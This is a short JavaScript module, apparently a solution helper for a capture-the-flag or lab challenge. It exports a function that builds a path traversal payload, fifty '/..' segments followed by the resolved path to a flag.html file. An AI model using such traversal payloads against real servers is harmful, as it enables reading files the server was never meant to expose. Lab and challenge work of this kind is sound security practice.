function getPayload() {
  const path = require("path"); // Ensure path module is imported
  const pathToFlag = path.resolve(__dirname, "../flag.html");
  return "/..".repeat(50) + pathToFlag;
}

module.exports = { getPayload };